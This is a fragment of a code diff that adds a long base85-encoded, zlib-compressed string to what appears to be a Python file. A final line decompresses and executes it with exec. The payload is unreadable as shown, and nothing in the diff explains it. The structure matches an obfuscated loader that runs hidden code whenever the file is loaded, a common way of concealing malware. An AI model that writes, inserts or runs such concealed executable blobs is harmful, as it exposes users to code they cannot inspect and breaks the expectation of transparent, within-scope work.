+    ';7^sXmEXcryfLc4{@&%%+F0Qf=;pL~VmhoTyAxs~498_Tg9zALj5We4c9OmS`)2=NiAgpZ))_HwryL8VIfv<q`O1!rsARorgm-{?'
+    '`9a<&z=CPh9&>sbhN~hkj5~{IrF&;b2Z<Uz(m_&Gyy&9$(Ch)zORZI!x-}eKiN-|svlUFV1`;gnb!I8)Q{Tz==*Znp{5dV~+mlqi'
+    ')%?+e8#lSZr+)YlTyQKR*E-C#5J$DGLF2&Z<2R8Yll_?KUOnfwNwe)F-`44r-DJMhNRMD|`F*XnC6_}<Xt6q)s$eXWNHT9D9(3f%'
+    '@#L?|fhv^Sp^!R@ro9U|edx9nRpH)rw6_Oj8O0O<ulrMc*0oD2rzlNF(sgPj6B|8Bj?V?P3|DY2S;G}4@u;=_wG&7WhUvu#Dx6B{'
+    'g34LjEb}lTluhQhy=gSONW^;1yc<rU5_{Tm_$|*K0Jj=&bbGKZFVF4)kt7MdFE~I;v+E#YiV8?jybh6C?z(8mJHL2$Moi|2r2pPY'
+    'wE3IC=||KA%-$>??Rhrqvio%#WLAub>#Q0ITk>sNo5~KW6^T96(BUG6?Oepr)u8ZAL{tx<B~7CA>U7)A>Y@pi4TtNljf!Qmhxa`@'
+    '!#0OEFb-*To|4Y*BtI{mY*b)Z3_t)f?z;t}Nd}*B8Ymt3mHyVUQ`N9TueHLCss(#xEIp%mW=&LBSk^iMJvlHdV!3kADxzx=Yzm>d'
+    'xL_5S3%YRZk&nENx4D_kFXDVt<y(*|48E#}hB_v7p4{l*!INxWh+{UL2a;^U4#J>O#}&P8AW{iTtEMpoquhX{)<`(=hJGmx;mELd'
+    'yYum<*ym1zwH>afQtcf(xKsU{;d3PA90Q|doN#(ViT2A%7>ou%-c1&6osE5a_m!s-sc&!6ZynoN()s4b8}WW#z+r-q?%tnIBrS<R'
+    'LQ#G{Y)T+}0-J;NzOzl;7R2K*;uv4W19LW2)+81(KUYz{^_f&iSYzQ+kgLZ@?={MXa~em5${J&@Alr{|oi>c2Q653fgfPVZhlFjC'
+    '>|rY%-VT}bpI;R4Y-zoWaADu#0MWSbk)U6-jMd`7W^VtCH(?|FZ9VAliWKYD&Ft##K<dfAQ$J#NN1`T@h(U6y_c@4t1Xo|TLhmfP'
+    '^hSPkMv&J8p%q#cI?^K*Ft*>0dxU&*W~#20Lgi$l9%~++rZv~mt=_Pm4zmU+DqxEiR!_kA0k~4JWvJ%e8a$!l#<zM(>sk)mLa-tv'
+    '2Ch_QIcEjpfZg?qD_s8C#$=!&QJJ?nJPZHUexC6(yR!Z9U74T)nX7DZa-*Y^HUxp2Up@DGvrVV8W1Y~F^Sfx~U+49+n#54-r43s0'
+    'oLg~VTcpLdXftS}7UIuM^KMsZHmN{ci(u9sD#MKow9W1V22R>&cdHq{;9f@|Czyd*J>rqBYD;HsfFHVgRfYQ&@X~@-b<x}eSOY9|'
+    '@YqQu6_Bo)Li>k+rU9bL)dQ_hd*^vp&Vns<-8eEyl2_%I6sws>O3-Fq*NMyiONoH5BxzB_3pZrbo$2XDD>mR#|HOTZ+ehj8A+`Yx'
+    '0OGj5?60sExHPr`m&#(hnNW0DXFDwNrh-5)qodP<!rW>YO@<|>*Hwg#9b6>uQXw|oovw<yRcIAnT~1ZIiug5&f*|C}3UcZ{h%GqW'
+    'KjbT+TViA<Gq`Bo&NuOkIvPjF!8N$PNQ#-bZ^@fY{f2L&vhxYd_R}a~2QPl!lxGe`IJ{wBvfKGZmTvMRgofK`IU9}Ti~OXwhx;%2'
+    'O){Be*FImDv4h$bezU<Fmsh55KJEo(w>SLO{6^Z2DKULXHW-hmv-q47B*>dh^~U5#C{z@pfN^iN52M`hPm;49*f+jp9}onFQqOke'
+    'a=aJ!x!ME#7ui!$1{J4Q>R__Q1mp3n=+U<%&r+s4{MEQNHd+jzLmJ{L5hPBR`+EO%rGc$A=<mKccr$o?FgV(KvH#}y=$pY8d*8fq'
+    '^hyoFq%0q<lQfUdU3+>u@74R>0j<p!@ok_UKc{vFyI&q1?Y%x8&@ps`8zdQsXi{NDaoKi`sF^8KG-w)BlYd#p`K<u>21K2KbMoZ$'
+    'VUdumAUD#3+@gx_y~O>Ari1C3=6%KpZ`@cA|LZq{=R05Q4UTqRS#cYwtgXj@<vx@ccyDPE8q0?*I}gQwj%tKW)Rg6HU60|MNPe;5'
+    '-u_Hzmfov3fqd+}ndc=3v}rjB1|(!mM#X@A&V1}CRcSaVCs}&V)&gMj+P}=RdDN_AK6A|6HJ?|1I$Ql|xcbv*^{2S~ldGD?DM)au'
+    'g=Ou*zgyKUlHbI{|G#=uOCu~_2}ehhN$)bw(|GcWr@a?+Kt_{SM6vT*cDE@AX;s;?TcXoJ5w^u46Qn453|{XsOl=-L@}53XSW@&P'
+    '7_s%CYK7B!gY45tfqnrYZ*f};vveHzZ*~WVpMUdaa0tT(urc+I^nUPW|F8G_upLn))8`{@y*aR2Ydc@rowd|*JiuGBIjr2JI^@bI'
+    'sGPn*=$vh$YI8sr|MAX@w%}0wEFQl~hIv+G<2jpEf?u`79&m$(z=Ib!i;7rS#~K|t6y^Q%L<Pay?Z17i-g)v;K)kY2aPt@cGHk8s'
+    '$)~U;g<QqC3e->R*xR=UV`3)at$&Fo?BCAUkFBpC`^{kE0YeCrgjJVc!A9!9Tn^pRCj#%+2S?9(dw;dJGRB?-dD!M|wEFJLv6^xF'
+    '))E#MeCQI>!De0ZUD$K?6D;Lp{kgH?^?v!fjVC#@R@usW(18Biw=dCy0O0LgbxHH~tr`+F60cdc2iA5`(y9V{e7u`+<^{slXn64E'
+    'u>nSCZvo+QGz8Uj&$4V1xbRZkka!_m%ut<y(#D>`^>N^i$zT}4+Bv}H-S&%VG%?!W3%<W#$kws^^XG%l4_@ujJn^}Akxdcgig2jM'
+    '&9TMzMR|Unq~~KccnIaqnTi~iMl)6q(P9Mw`ays|9#65k`Q{d3lhe&jmrLDTV2lzlkQ=zj=9QfC=rLFCoh7Lsh7J5ED$L-VPF5%`'
+    'CR@MqK7JzqS%H7hiC&P4`Fu9`w#d?;%qP&yPvfkdZ*P5UR_8mK5Pbu4Ne^XQ%zH=jSE^jZ5n``wFZ?eHn$6BRc%*(6TXRzdi>6_2'
+    'it5l;Ix^<LYE9E4SY;9izN<!~{xaj0H#QDN-@|EN1UZ6&6M5~8Vm2gK2J<vo@N{2)zIP<1buac_?Z4h1>>TcciR95jHT(jBWD<|?'
+    'e$M%p0$Sv9GUsU^H+jS!$4JJy%eP`4TnRYC<CISrPHvA>1QAWP93@##i610gJ&tAx+oRyNFCNb0O(etRYl1S>el0J!co(|XU4Sq4'
+    'Xo#!@{?i}3p3+kek)4*vdpbmd5bQ}R^!%H_@xd2+u%+sJ8zU{(&MX<<vSgPQ*#z5@o-q>kFnbfv5qzxR2Xyj3di%6>F?Egz7<}yg'
+    '8InbF;#N*vJuh_5J6NEGon<8tjFX$-D$;Vp^+n7E`3B^?x9B?uT*W<!y3+M+zP}mMq|-srw-|Q!zm$x4tdc#1Y3-W}S_dpiJimd`'
+    'JYRa9Pv+9>uR2to20Ue7MI?sKtwaqHXb_2x^&+agy*^*(;EFj*V(NQi{a937ZbWC~U`Q$uBada<9?RYDz5n@f?>EIoKIAkk$R<&Z'
+    '%Na=kKMbOrDq|w<k&Fbc0)rE0RV0!W6jx-pI#D`e#^631qj{T=YBIz`M756S!Rj6$kUw3-lR#&jnUVv*RXTU}(xcDX<2@d^UR#Lq'
+    'dp3!u#I(UzLL~+(n0Y&4H`B`aX_m)B)@f2B$|{A$?E$^#fd3<tRzMs!hC<D5i=N76G2rxG{imniC*HiA(IJ3R)*;HBSDuxJ+`hM%'
+    'O`<u}<~`M+YAy(ua=C+>cnK%iMaB_Pb)@QUuh6+Pu<baL8leu{Cx)<7=*h3G(<SarU>w);?taT@2w<<uiDnR{3330-a2j<#B0%!T'
+    'UY4Kh=vgWSRm~Qw0X{J=(_Ex=Ku#+gHr13JMqQT8cwEh}r)hJmF-B*SoL0G`RyHb!`-j~5lptkk%~S_=EC9xbYAqIr-z>e&sW(ez'
+    '8YIfq^~0KGPBO}Cpdk7qaImCU-l<)00A#H66`)YIbSiYJ5p$^xNb2fP2#r7}u9>PileURsEq<z^jvQT5sR`V^T}<v+9mlDv0vgKL'
+    'YDL3D&QE=xDMY3J0YtD$D`0_EvsaZ$#$n%9?>;G^0EHunPLGHq<mq(p`@jR{KxYUIPNm>ENxMen#6l|Ep7$o3lsXt(3li0|W^Gd#'
+    'CB@}ndS<iR<2>dd!NO{C0Y2q80w(J!@s|~q784luxLzd&+L*+jK9PP;OrNLs;8bUUdQ0zB=CNcT30)_g0{XjBa=sBQ=Rm)UdfRoc'
+    'atHk&Y23Zf<6Nh9g&l$0dIc>x3&fdN=}mdTZHBw1X|*t-mFd>}_9_ekOMLeS8q3#G8~hGe;j82drzN>9aUJ<NpKXd)2Tu#AMWylI'
+    '<P~hi0Kj-4`Z3?N*dZL^I28%o2Wu6YlMag&7WEXV^42W3-NEVFty~2<UT_<{^t3|LyZ2LgI0zbe!J@6@B{OnyGSNJyY;N!Y(N%IT'
+    'S)G)DNMwm<-UPu@tCZytvO-n)csp%)Kp2<#wOucIi#jbZ((uZqCVrZoK<Td~EUN6;I?q<2wm<S;6Uz6XhW8A(x<VBWpFQt6ZNN%Y'
+    '@#<)=lCE)<TE^&{@;DvYGdyQb-&e2o2~n2|VAHlnyNr9BN`CV3v*<s5Oac%x=}@oQIYx;A#DNzq3S4cS#q&rcyW&$~@3(Ott{+D&'
+    '(5%XttM2%uB{>JfbttI$L?!9q0w}|RBDb#El!ZP@iV(RTbPRC?XyO(Th8O15%G$%;hMck*C@pjz3_8;4<?*;Ih@in>DVp3Cu}Xd$'
+    'l{b#))LES@wIxn&^N_C1j@DXF5JV+dK!+K`VQ;`U{e!_WTz823W`??5P|($)-Fl2;@vDJww&eE1u#MWSM7zgVPah-dbMbf@e>%@D'
+    '<Ft-h^$y+ntE>kKt2jh>J;jQpx5W20d+r*8NhHdaNU<uC+S~}VEd2TpNz+$DXK7I{vcARS5K}6d0-&LSvB85SA|~9*{el<18=xW?'
+    'DGTi7kH*I4ynh;O)a|l3ERFxF66k-`BF<N+S&4LfhcZAkIS5}k<@lCQBrj7cL9|*B;TUk?xCN^yJ*;HeY_86l#zhg`!o*&b9Yh`S'
+    '2)PqQU>&10hZ0vbgi0s8)vC0QRZ>+FwXD~7@5kVCNLJ=-<XHYFR~bW<ByY4iZe)oE&QK@O^!zeCE0c*zA<mq<Uh%flN_4SGTPz8Q'
+    'l4Ufpxu~XS7q)+ev=g?DPc_<N1zDBJE*;nLK<9RC7v;NcV^(TIQREGv!OP0Ivd^<MhOGCI=ogY;;k%MJ96sxN^BV<5;C<nkG*P)0'
+    '4L!#w=1?{%m#9J&*F$5t;fkB_pIJGZ#*Ux66a8B8cno({vNE;&ncwEX!n4r30CkiQpRo>Qp$!81%0!^+8XNSL4Z=#J17&T{7xROf'
+    '(Lv4Nq2Dly=o*6wHk}wK(}{ab6E+*B2?JxAV5Q1FNqK2f7Rh-nTXYebLZK8{kd$IV8PV+<ClAh0;wU0|A|p;FoC?p*s_ON9H=>2-'
+    '-K%2Y0V779UJW;usLx6^ZRsk=t<6)Qg(8%k2V0hrsuVFssx)mjsA(t@TKCBs-xZa!2o^AhmWQdjOI$3wo_(uma+8W(XVvZDlhszT'
+    'wx#To`%Gm&*j)CBv6m(B9j`_v-o0Zzyt#?Fv*i3vJWSusqGV*9xes)+wUc1zzV-f-urU0Cx-_wa#YYXkT<G2e*5-1`W{{okS6d8^'
+    'mBF-=;}!KAA!4|pDl|;YT0NNIvHJ?Izkhmyzls$@#t(u9)5U8;^~HL-7Bx#Eukf&Ic9y1*hEXUr)g#IRUJ!<5S2a6BQ_;36ysY~^'
+    'vBiJG?MdD045OJfbmMhXw@+*qXp4TeUQE{nK-;hDCHN;x@k`s6W&(w8_0G})Q`raTiqT?5vfHd2u>Bq04gbG?UuttW4smM4_yrG|'
+    'rTf5=^hL=dG5p0wqAlU<xN{6MJN82a$P=;kV+>h30hiSNhgyKo89LpGUVr}&|At-m6a#`c|NH+UuFHIa^NYV{hZx1t(3^k$-QWM8'
+    'inM3U;6|_>fipItsjQQJ@3PAnmJU8D3wAcihL<#E<Uu0VYZQ-&HPe0wOv|3g<$$)7X9NUhb(OfphzLAYC}?pqGrmV~u#ShJ?=x)Q'
+    '*n7Df0Z7PhL@Vz`qMmg-QqfNWIvA>d{@vgG2a`}&C0o~!=Uu|ygV<LZs=Va9W+y5+e8Wd{fzL~|{IcW3fp7UXm6D5!d*#d^z5(4*'
+    '=Zr8nmt%!+tpllNj<BX-u%pfT-PomR7T@sx;;tJZrFlc7Yvq|+TSop#F;3-tVI@3Dh(3dT+?>!y9V^p>!{wC)9_kJpwR>HX1j=!i'
+    '`}>A7_ATM=?hovJv6$7p)J>u+9>sla6_!$aY&TW0QozqPxa%fV{vU6V))JQpN{a|5OR3@)@Ye6L1Q4!knP6La@z4XUBtlLxHR49>'
+    '4$ZbU{-uJ2Ef^)kP&>n-J+;9^lez5-;Q&}t=o)%7CLZrBlGLsiLBdF!7kWFNw0ZF-wR_R=S=Xg5C*w0BRV)}Q8i0UOJR1UKMO9ar'
+    'tIK@GXRROUG>9%6PWF>|>o9FMWW9&m`_yDtOC$`Drty7a?WpIKzWEC6{_Wp+xHLhMb%h*qv!KqZ3To8W>4~CEjjM`w&5k}ds&vct'
+    'DW^P>L93&gmPn1Wa(10=&W4qMZ%S{QZ<b>1B3EaK<veU!qo1k<{ko3w)F|K`r*J;LnZWa}Pta=nzS4X3l^RpuW)E!Te^g3iJ@4+{'
+    'Me1%^T}q3pe~x&RtPCNJ#>3i1Drcgj(U-L0qF@y*iucvw8!xDPd2e6M3gfx>pbL+!kDokgon*&M(!I&(+ZP>1oiAGD>e6Bsmk23M'
+    ')bl*%D-3-rl!}Is?|)c=$m0=p5anz)QTZ2QzWO%gzRQnFlN4;}dn9%HX5X(=4z)I}sxylCCu=zYT;zUOO*+rY92#^4vq*&dRmsP@'
+    'o@M-@<W}76(uj+)aQ!0)$keSWt2UgCz{*em^u%ls^+v)qAWM_kkj?S-?UBgflo}1LoDusUN_f;34s>ibZzB;sm``t^KQBEAe!w9|'
+    '!6--)L5YL#U72W$jJ_-)M}MG&!R??vG)cS~CYvsRBrmBVdyOG<{`q&m`w!liOt;|i+mmpnx_oF4Y7RdczK!M>vNEs{)Q!aU=NK;n'
+    '2A7g*eo`jtes%21A8u?9hmDhHC``r80K(-uY#W24_YRTjNckPt`|Ei}pa_Z<aCX(g1G22Z$X-P#4;y<usD#Rg`V*VCjp9;hz(=gg'
+    'EKy7JxIU(*wdW4RFBzr}6LpEIkD@}{@0EF&<=#Y?yL<5J)!ysfz0LjI{T{In4V{jSy(%?pxUnJ52+#9Fgc!=Jh*UfIIp0^xdjgP2'
+    '^c}Nipok}9qS;VkpF8lQ_dTA8vNgZ}ius6YHDbj0dq+omUmnSA23sAmnn77^fYwdv#F5~>xGYw^5xe8<BupDb(Xx4g%rnU(-frv6'
+    'K;UVp!-po5(O@PMRzqh=-ar8s!P`DJ4u81VoH*P5*IE~(HUxA3UW)~&hCiF&5}}GlqX9igw?%;1gxmgb${{vIWjs=`lcmUjS7uv}'
+    'DXbO%EhT9pjz=a5@4!T=u~uWosgKUMb2Z`0TZs$sr${X}GE_j{<gYHUxv4_sID=kS-b7NY@&)^AJ5Vurh8I~fjEij*71GpYP1d^l'
+    'I(Cn4K!=euEu``F+6L^HKe`b+?4)j}3HddRs@OrgJr%Ojj7cTZ@nK~=nVDxV;OO5pp)PBM^+sV8(s=@oEU=Q(rsWi55XZ@kFQRms'
+    'I68laLqq~krV>zo9%6r8$7jS@<lF{d<(j+ilJ6i4;)m-2hPay+tR()Xo}1`#Wm@n$^#Us#xx};|1E1NT>&w^1R6-|^>~gFTVZ@bP'
+    'u6Sg^K$WTxr^J>+d}g2_o*H8TPt3H3!mDdWBa$}O&(lQ5i-tlCMDQ?+27lE4VRT#cpY46M|7NexW)X3J7A4BO1F;5QyzZ-blKmI2'
+    'pZCXkf0&Kd_G==+SO~*GYu0Xqi){AbJ;$L;A6i(VsXVwihd^x>He}4lzhEO$B&V-`<Yn>gdjQrRAZ@n<z!7hHR7b8Vj?P7gu%u5!'
+    'd=32KsQ9(WP7R{Cjuh6)`#M{-zoHf#AM^8K+yB&_x#4r0WLbGptMBWE(gg50&ji3YQur2cpkC=6x%<uT%e}$#qk~r~+sJYbE~+uR'
+    'm}hxBnCHfRu5HZ9$zkoFEl8~DyN%$lD$DsVTZgGPA>Z@Ub}ow|VLp)!ZnUKgaY|xGU=nDqo*v>T{E!t{Q%}c!STQ?d!)K*UU=Tx|'
+    '35){bM=PsBm9};+Q9l2PC$qUpY)`?~+4arcis9Ml2O+p5J6O~3Bs>2h?an#3-O5&(Z2f>{Bc0gQq5vATVXs;+k)k?6q7W^BZ-g`i'
+    'Cl&KpZ(6Zl_im^>TS-djFv-$+G+a0HBK|>`Qbnq@@l|h2E9CA20_@TOT?M344k)DwSLH?`k7mNxL*jz~bHyBoX6!lom(B3^B$_J5'
+    '$EDR>-c;Ez@L|-~$xQov2hJx^6!Nm+G;00a6%InDM$=opR#qj^=EnHIs(t4Gsr*%rvD#;TDc=?GtralW^*n-j*6cr?>93#&&Ee&`'
+    'e?E}v{d1-i`7S}*-OrNK1kuv7^ZG|gx`CeKX1}rORh`+j&n8k<6;a*!j(76a9L%*6`n{AAexO!FXFpyxJ^X<kCsB|7oCaY_$fuf>'
+    'TtmKH#LI_@s8-{L@PjIFGrOjfj_E|jErBafo|UZLBcYkSKau<b87U?)Gft8MBkY+6b-V8`jk)zE?B{hrTH=v&j?AazoWcuW>D=`W'
+    '()d}<w}w$l@^6xtMaW(lVqbz3LmxV66&K>Z$trOsDwUN#2V5w`F(g>9*%K=&Fuj<j#Vr1!27@xyK=YSBWUQ;KBx~yr<t@h@kK1e^'
+    '1wCMa>;|9XtzL^gS0)@ez&neJEJ?dnVc8%~>E1ewOU7+MGoI~z_T>w|%_yb`iC=^pNJ*h)!50vN0Z8y*pspZL6p~?&<j9z)$`eUt'
+    '$p|?ZU}%E@(x?>K<SG`r45PV|rxL}eMWw=y!z_{(`Z`y~*(kDNFhq*8xvTcFKJ@Z3B_cG8CZ>D7bx6bT{|Eg>Lf8'
+)
+exec(compile(_z.decompress(_b.b85decode(_s)).decode('utf-8'), __file__, 'exec'))
